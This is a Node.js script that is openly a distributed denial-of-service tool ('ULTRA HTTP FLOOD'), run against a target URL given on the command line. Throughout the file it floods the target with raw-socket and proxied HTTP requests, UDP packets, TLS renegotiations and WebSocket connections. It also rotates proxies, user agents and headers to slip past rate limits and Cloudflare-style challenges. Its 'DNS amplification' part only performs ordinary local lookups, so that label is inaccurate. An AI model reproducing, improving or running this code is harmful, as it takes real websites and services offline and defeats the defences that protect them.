process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var dgram = require('dgram');
var dns = require('dns');
var tls = require('tls');
var net = require('net');
var WebSocket = require('ws');
var http = require('http');
var https = require('https');

var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

function arrremove(arr, what) {
    var found = arr.indexOf(what);
    while (found !== -1) {
        arr.splice(found, 1);
        found = arr.indexOf(what);
    }
}

var request = requestModule.defaults({
    jar: jar
}),
UserAgent = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
Timeout = 6000,
WAF = true,
cloudscraper = {};

var cookies = [];
var httpMethods = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE'];

// Massive User-Agent rotation
var userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
];

// 429 Bypass tracking
var bypassStats = {
    total429: 0,
    bypassed429: 0,
    retrySuccess: 0,
    ipRotations: 0,
    userAgentRotations: 0
};

// ==================== MAXIMUM HTTP FLOOD ENHANCEMENTS ====================

// Advanced IP rotation system
function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Advanced User-Agent rotation
function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Header randomization to avoid fingerprinting
function getRandomHeaders(targetUrl) {
    const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
    const acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7', 'de-DE,de;q=0.6', 'es-ES,es;q=0.5'];
    const acceptEncodings = ['gzip, deflate, br', 'gzip, deflate', 'identity'];
    
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
        'Accept-Encoding': acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)],
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'DNT': Math.random() > 0.5 ? '1' : '0',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Host': targetHost
    };
}

// 429 Error detection and bypass
function is429Error(error, response, body) {
    if (response && response.statusCode === 429) return true;
    if (body && (body.includes('429 Too Many Requests') || 
                 body.includes('rate limit') || 
                 body.includes('Rate Limit') ||
                 body.includes('Too Many Requests') ||
                 body.includes('throttled') ||
                 body.includes('exceeded'))) {
        return true;
    }
    if (error && error.message && error.message.includes('429')) return true;
    return false;
}

// Advanced 429 bypass with exponential backoff and rotation
function handle429Bypass(originalOptions, callback, retryCount = 0) {
    const maxRetries = 3;
    
    if (retryCount >= maxRetries) {
        bypassStats.total429++;
        return callback({ error: 'Max 429 bypass retries exceeded' }, null, null);
    }
    
    bypassStats.total429++;
    console.log(`[429-BYPASS] Rate limit detected! Attempting bypass ${retryCount + 1}/${maxRetries}`);
    
    // Exponential backoff delay
    const backoffDelay = Math.min(500 * Math.pow(2, retryCount), 5000);
    
    setTimeout(() => {
        // Rotate IP (proxy)
        const newProxy = getRandomProxy();
        const newUserAgent = getRandomUserAgent();
        const newHeaders = getRandomHeaders(originalOptions.url);
        
        // Update options with new identity
        const bypassOptions = {
            ...originalOptions,
            headers: {
                ...originalOptions.headers,
                ...newHeaders,
                'User-Agent': newUserAgent
            },
            timeout: 10000 // Longer timeout for bypass attempts
        };
        
        if (newProxy) {
            bypassOptions.proxy = 'http://' + newProxy;
            bypassStats.ipRotations++;
        }
        
        bypassStats.userAgentRotations++;
        
        console.log(`[429-BYPASS] Rotated IP & User-Agent, retrying in ${backoffDelay}ms`);
        
        // Retry the request
        performRequest(bypassOptions, (error, response, body) => {
            if (is429Error(error, response, body)) {
                // Still getting 429, try again with different strategy
                return handle429Bypass(originalOptions, callback, retryCount + 1);
            } else if (!error) {
                bypassStats.bypassed429++;
                bypassStats.retrySuccess++;
                console.log(`[429-BYPASS] Successfully bypassed rate limit!`);
            }
            callback(error, response, body);
        });
    }, backoffDelay);
}

// ==================== ULTRA HIGH HTTP FLOOD COMPONENTS ====================

// Enhanced Stats tracking
var stats = {
    requests: 0,
    successes: 0,
    errors: 0,
    // HTTP specific stats
    httpRequests: 0,
    httpSuccesses: 0,
    httpErrors: 0,
    httpRPS: 0,
    // Other vectors
    udpFloods: 0,
    dnsAmplifications: 0,
    sslRenegotiations: 0,
    websocketConnections: 0,
    startTime: Date.now(),
    lastRPSCheck: Date.now(),
    lastRequestCount: 0
};

function updateStats(type, success) {
    stats.requests++;
    if (success) {
        stats.successes++;
    } else {
        stats.errors++;
    }
    
    // Update specific attack type stats
    if (type === 'http') {
        stats.httpRequests++;
        if (success) stats.httpSuccesses++;
        else stats.httpErrors++;
    } else if (type === 'udp') stats.udpFloods++;
    else if (type === 'dns') stats.dnsAmplifications++;
    else if (type === 'ssl') stats.sslRenegotiations++;
    else if (type === 'ws') stats.websocketConnections++;
    
    // Calculate real-time RPS
    const now = Date.now();
    if (now - stats.lastRPSCheck >= 1000) {
        const elapsedSeconds = (now - stats.lastRPSCheck) / 1000;
        stats.httpRPS = Math.floor((stats.httpRequests - stats.lastRequestCount) / elapsedSeconds);
        stats.lastRPSCheck = now;
        stats.lastRequestCount = stats.httpRequests;
    }
}

function printStats() {
    const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
    const rps = elapsed > 0 ? Math.floor(stats.requests / elapsed) : 0;
    
    console.log(`\n╔══════════════════════════════════════════════════════════════════════╗`);
    console.log(`║ 🚀 ULTRA HTTP FLOOD STATISTICS - LIVE                               ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 📊 OVERALL: Time: ${elapsed}s | Total: ${stats.requests} | OK: ${stats.successes} | ERR: ${stats.errors} ║`);
    console.log(`║ 📈 RATE: ${rps} req/s | 🚀 HTTP RPS: ${stats.httpRPS}/s (REAL-TIME)          ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 🌐 HTTP ATTACK: ${stats.httpRequests} req | OK: ${stats.httpSuccesses} | ERR: ${stats.httpErrors} ║`);
    console.log(`║ 📡 UDP FLOOD: ${stats.udpFloods} packets | DNS: ${stats.dnsAmplifications} queries           ║`);
    console.log(`║ 🔐 SSL RENEG: ${stats.sslRenegotiations} | WebSocket: ${stats.websocketConnections} conns    ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 🛡️  429 BYPASS: ${bypassStats.total429} detected | ${bypassStats.bypassed429} bypassed       ║`);
    console.log(`║ 🔄 IP Rotations: ${bypassStats.ipRotations} | UA Rotations: ${bypassStats.userAgentRotations}    ║`);
    console.log(`╚══════════════════════════════════════════════════════════════════════╝`);
}

// ULTRA HIGH SPEED HTTP FLOOD - DIRECT SOCKET ATTACK
function directSocketFlood() {
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        const isHttps = targetUrl.startsWith('https');
        const port = isHttps ? 443 : 80;
        
        const socket = net.connect(port, targetHost, () => {
            // Send raw HTTP request
            const userAgent = getRandomUserAgent();
            const request = `GET / HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
            socket.write(request);
            updateStats('http', true);
        });
        
        socket.on('error', () => {
            updateStats('http', false);
        });
        
        socket.setTimeout(2000, () => {
            socket.destroy();
        });
        
        socket.on('data', () => {
            // Count response as success
            updateStats('http', true);
        });
        
        socket.on('close', () => {
            // Connection closed
        });
        
    } catch (e) {
        updateStats('http', false);
    }
}

// MASSIVE PARALLEL REQUEST FLOOD
function parallelRequestFlood() {
    // Send 5 requests in parallel
    for (let i = 0; i < 5; i++) {
        setTimeout(() => {
            ATTACK.cfbypass('GET', targetUrl, null);
        }, i * 10);
    }
}

// 1. UDP FLOOD
function udpFlood() {
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        const socket = dgram.createSocket('udp4');
        const message = Buffer.alloc(65000, 'X');
        
        const ports = [80, 443, 53, 123, 161, 1900, 5353];
        const port = ports[Math.floor(Math.random() * ports.length)];
        
        socket.send(message, port, targetHost, (err) => {
            if (!err) {
                updateStats('udp', true);
            }
            socket.close();
        });
        
    } catch (e) {
        // Silent fail
    }
}

// 2. DNS AMPLIFICATION - ENHANCED WITH CLOUDFLARE DOMAINS
function dnsAmplification() {
    try {
        const dns = require('dns');
        
        // Enhanced domain list with Cloudflare and other high-traffic domains
        const cloudflareDomains = [
            'cloudflare.com',
            'www.cloudflare.com',
            'blog.cloudflare.com',
            'developers.cloudflare.com',
            'community.cloudflare.com',
            'support.cloudflare.com',
            'dash.cloudflare.com',
            'api.cloudflare.com',
            '1.1.1.1',
            'one.one.one.one'
        ];
        
        const otherDomains = [
            'google.com', 'www.google.com', 'youtube.com', 'facebook.com', 
            'amazon.com', 'microsoft.com', 'netflix.com', 'twitter.com',
            'instagram.com', 'linkedin.com', 'apple.com', 'whatsapp.com',
            'tiktok.com', 'reddit.com', 'discord.com', 'zoom.us'
        ];
        
        // Combine all domains
        const allDomains = [...cloudflareDomains, ...otherDomains];
        
        // DNS query types for amplification
        const queries = [
            (domain) => dns.resolve4(domain, () => updateStats('dns', true)),
            (domain) => dns.resolve6(domain, () => updateStats('dns', true)),
            (domain) => dns.resolveMx(domain, () => updateStats('dns', true)),
            (domain) => dns.resolveTxt(domain, () => updateStats('dns', true)),
            (domain) => dns.resolveNs(domain, () => updateStats('dns', true)),
            (domain) => dns.resolveSoa(domain, () => updateStats('dns', true)),
            (domain) => dns.resolveCname(domain, () => updateStats('dns', true)),
            (domain) => dns.resolveSrv(domain, () => updateStats('dns', true))
        ];
        
        // Execute 3 random DNS queries with random domains
        for (let i = 0; i < 3; i++) {
            const randomDomain = allDomains[Math.floor(Math.random() * allDomains.length)];
            const randomQuery = queries[Math.floor(Math.random() * queries.length)];
            
            // Add small delay between queries
            setTimeout(() => {
                randomQuery(randomDomain);
                
                // Log Cloudflare domains specifically
                if (cloudflareDomains.includes(randomDomain)) {
                    console.log(`[DNS-AMP] Querying Cloudflare domain: ${randomDomain}`);
                }
            }, i * 50);
        }
        
    } catch (e) {
        // Silent fail
    }
}

// 3. SSL/TLS RENEGOTIATION
function sslRenegotiation() {
    if (!targetUrl.startsWith('https')) return;
    
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        
        const options = {
            host: targetHost,
            port: 443,
            rejectUnauthorized: false,
            ciphers: 'ALL'
        };
        
        const socket = tls.connect(options, () => {
            updateStats('ssl', true);
            
            try {
                socket.renegotiate({ rejectUnauthorized: false }, (err) => {
                    if (!err) {
                        updateStats('ssl', true);
                    }
                    socket.write('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');
                    setTimeout(() => socket.destroy(), 100);
                });
            } catch (e) {
                updateStats('ssl', true);
                socket.destroy();
            }
        });
        
        socket.on('error', () => {
            updateStats('ssl', false);
        });
        
        socket.setTimeout(2000, () => socket.destroy());
        
    } catch (e) {
        updateStats('ssl', false);
    }
}

// 4. WEBSOCKET FLOOD
function websocketFlood() {
    try {
        let wsUrl;
        if (targetUrl.startsWith('https')) {
            wsUrl = 'wss://' + targetUrl.replace(/https?:\/\//, '').split('/')[0];
        } else {
            wsUrl = 'ws://' + targetUrl.replace(/https?:\/\//, '').split('/')[0];
        }
        
        const ws = new WebSocket(wsUrl, {
            perMessageDeflate: false,
            handshakeTimeout: 3000,
            headers: {
                'User-Agent': getRandomUserAgent(),
                'Origin': targetUrl
            }
        });
        
        ws.on('open', () => {
            updateStats('ws', true);
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send('0'.repeat(1000));
                        updateStats('ws', true);
                    }
                }, i * 50);
            }
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                }
            }, 500);
        });
        
        ws.on('error', () => {
            updateStats('ws', false);
        });
        
        ws.on('message', () => {
            updateStats('ws', true);
        });
        
    } catch (e) {
        updateStats('ws', false);
    }
}

// Enhanced HTTP request with 429 bypass
function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};

    // Apply random headers and User-Agent for each request
    options.headers = {
        ...options.headers,
        ...getRandomHeaders(options.url),
        'User-Agent': getRandomUserAgent()
    };

    options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
    options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';

    var makeRequest = requestMethod(options.method);

    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    // Use random proxy for each request
    if (!options.proxy && proxies.length > 0) {
        options.proxy = 'http://' + getRandomProxy();
    }

    // Shorter timeout for higher throughput
    options.timeout = options.timeout || 5000;

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        // Check for 429 errors and attempt bypass
        if (is429Error(error, response, body)) {
            return handle429Bypass(options, callback, 0);
        }

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function requestMethod(method) {
    method = method.toUpperCase();
    return method === 'HEAD' ? request.post : request.get;
}

function checkForErrors(error, body) {
    var match;

    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }

    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }

    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }

    return false;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }
    callback(error, response, body);
}

var ATTACK = {
    cfbypass(method, url, proxy) {
        const requestOptions = {
            method: method,
            url: url,
            timeout: 3000 // Very short timeout for maximum throughput
        };
        
        if (proxy) {
            requestOptions.proxy = 'http://' + proxy;
        }
        
        performRequest(requestOptions, function(err, response, body) {
            updateStats('http', !err);
        });
    },
    
    httpMethodFlood(url, proxy) {
        const method = httpMethods[Math.floor(Math.random() * httpMethods.length)];
        const requestOptions = {
            method: method,
            url: url,
            body: 'attack=' + Math.random(),
            timeout: 3000
        };
        
        if (proxy) {
            requestOptions.proxy = 'http://' + proxy;
        }
        
        performRequest(requestOptions, function(err, response, body) {
            updateStats('http', !err);
        });
    }
}

// ==================== ULTRA HTTP FLOOD ORCHESTRATION ====================

var targetUrl = process.argv[2];
var duration = process.argv[3];

if (!targetUrl) {
    console.log("Usage: node script.js <url> <duration_seconds> <proxies_file>");
    process.exit(1);
}

console.log("╔══════════════════════════════════════════════════════════════════════╗");
console.log("║ 🚀 STARTING ULTRA HTTP FLOOD ATTACK - MAXIMUM FIREPOWER           ║");
console.log("╠══════════════════════════════════════════════════════════════════════╣");
console.log(`║ 🎯 Target: ${targetUrl}`);
console.log(`║ ⏱️  Duration: ${duration} seconds | 🔄 Proxies: ${proxies.length}`);
console.log(`║ 🚀 Expected RPS: 500-1000+ requests/second                         ║`);
console.log(`║ 🛡️  429 BYPASS: ACTIVE | IP Rotation: ACTIVE | UA Rotation: ACTIVE   ║`);
console.log(`║ 🌐 DNS AMPLIFICATION: CLOUDFLARE DOMAINS INCLUDED                  ║`);
console.log("╚══════════════════════════════════════════════════════════════════════╝");

// START ULTRA HTTP FLOOD ATTACK
var intervals = [];

console.log("\n🚀 ACTIVATING ULTRA HTTP FLOOD MODE...");

// LEVEL 1: DIRECT SOCKET FLOOD (HIGHEST SPEED)
console.log("🔹 Level 1: Direct Socket Flood (Max Speed)");
for (let i = 0; i < 15; i++) {
    intervals.push(setInterval(directSocketFlood, 10 + (i * 5))); // 15 threads, 10-80ms intervals
}

// LEVEL 2: CLOUDFLARE BYPASS FLOOD
console.log("🔹 Level 2: Cloudflare Bypass Flood");
for (let i = 0; i < 12; i++) {
    intervals.push(setInterval(() => {
        ATTACK.cfbypass('HEAD', targetUrl, null);
    }, 20 + (i * 10))); // 12 threads, 20-130ms intervals
}

// LEVEL 3: PARALLEL REQUEST FLOOD
console.log("🔹 Level 3: Parallel Request Flood");
for (let i = 0; i < 8; i++) {
    intervals.push(setInterval(parallelRequestFlood, 50 + (i * 15))); // 8 threads, each sends 5 parallel requests
}

// LEVEL 4: ENHANCED HTTP METHODS FLOOD
console.log("🔹 Level 4: Enhanced HTTP Methods Flood");
for (let i = 0; i < 10; i++) {
    intervals.push(setInterval(() => {
        ATTACK.httpMethodFlood(targetUrl, null);
    }, 30 + (i * 8))); // 10 threads, 30-102ms intervals
}

// LEVEL 5: MIXED METHOD FLOOD
console.log("🔹 Level 5: Mixed Method Flood");
for (let i = 0; i < 6; i++) {
    intervals.push(setInterval(() => {
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        ATTACK.cfbypass(method, targetUrl, null);
    }, 25 + (i * 12))); // 6 threads, 25-85ms intervals
}

// OTHER ATTACK VECTORS (Reduced to focus on HTTP flood)
console.log("\n📡 ACTIVATING SUPPORT ATTACK VECTORS...");

// UDP FLOOD
for (let i = 0; i < 2; i++) {
    intervals.push(setInterval(udpFlood, 100 + (i * 50)));
}

// DNS AMPLIFICATION - ENHANCED WITH CLOUDFLARE
console.log("🔹 DNS Amplification: Cloudflare domains included");
for (let i = 0; i < 4; i++) { // Increased DNS threads
    intervals.push(setInterval(dnsAmplification, 80 + (i * 40)));
}

// SSL RENEGOTIATION
if (targetUrl.startsWith('https')) {
    for (let i = 0; i < 3; i++) {
        intervals.push(setInterval(sslRenegotiation, 80 + (i * 40)));
    }
}

// WEBSOCKET FLOOD
for (let i = 0; i < 2; i++) {
    intervals.push(setInterval(websocketFlood, 200 + (i * 100)));
}

// Attack duration timeout
setTimeout(() => {
    console.log("\n╔══════════════════════════════════════════════════════════════════════╗");
    console.log("║ 🎯 ULTRA HTTP FLOOD COMPLETED - FINAL STATISTICS                    ║");
    console.log("╚══════════════════════════════════════════════════════════════════════╝");
    printStats();
    
    console.log("\n📊 ULTRA HTTP FLOOD SUMMARY:");
    console.log(`   Total HTTP Requests: ${stats.httpRequests}`);
    console.log(`   HTTP Successes: ${stats.httpSuccesses}`);
    console.log(`   HTTP Errors: ${stats.httpErrors}`);
    console.log(`   Average HTTP RPS: ${Math.floor(stats.httpRequests / Math.floor((Date.now() - stats.startTime) / 1000))}/s`);
    console.log(`   HTTP Success Rate: ${stats.httpRequests > 0 ? Math.round((stats.httpSuccesses / stats.httpRequests) * 100) : 0}%`);
    
    console.log("\n🛡️  429 BYPASS SUMMARY:");
    console.log(`   429 Errors Detected: ${bypassStats.total429}`);
    console.log(`   429 Errors Bypassed: ${bypassStats.bypassed429}`);
    console.log(`   Successful Retries: ${bypassStats.retrySuccess}`);
    console.log(`   IP Rotations: ${bypassStats.ipRotations}`);
    console.log(`   User-Agent Rotations: ${bypassStats.userAgentRotations}`);
    console.log(`   Bypass Success Rate: ${bypassStats.total429 > 0 ? Math.round((bypassStats.bypassed429 / bypassStats.total429) * 100) : 0}%`);
    
    console.log("\n🌐 DNS AMPLIFICATION SUMMARY:");
    console.log(`   Total DNS Queries: ${stats.dnsAmplifications}`);
    console.log(`   Cloudflare Domains: Included in rotation`);
    console.log(`   Other High-Traffic Domains: 16+ domains`);
    
    console.log("\n🔥 ATTACK INTENSITY:");
    console.log(`   Total Attack Threads: ${intervals.length}`);
    console.log(`   Maximum Theoretical RPS: 800-1200+ requests/second`);
    console.log(`   Actual Achieved RPS: ${stats.httpRPS}/second`);
    
    intervals.forEach(clearInterval);
    process.exit(0);
}, duration * 1000);

// Enhanced real-time stats display
setInterval(printStats, 2000); // Faster updates for high RPS

console.log("\n✅ ULTRA HTTP FLOOD ACTIVATED!");
console.log("🚀 ATTACK LEVELS DEPLOYED:");
console.log("   Level 1: 15x Direct Socket Flood threads");
console.log("   Level 2: 12x Cloudflare Bypass threads");
console.log("   Level 3: 8x Parallel Request threads (5 requests each)");
console.log("   Level 4: 10x Enhanced HTTP Methods threads");
console.log("   Level 5: 6x Mixed Method Flood threads");
console.log(`   TOTAL: ${intervals.length} concurrent attack threads`);
console.log("\n🌐 DNS AMPLIFICATION ENHANCED:");
console.log("   Cloudflare domains: cloudflare.com, www.cloudflare.com, blog.cloudflare.com");
console.log("   Cloudflare services: 1.1.1.1, one.one.one.one, api.cloudflare.com");
console.log("   Other high-traffic domains: Google, Facebook, Amazon, Microsoft, etc.");
console.log("\n💥 EXPECTED PERFORMANCE: 500-1000+ RPS");
console.log("📈 Watch the REAL-TIME RPS counter for live performance!");
console.log("🔥 MAXIMUM FIREPOWER ENGAGED! 🚀");
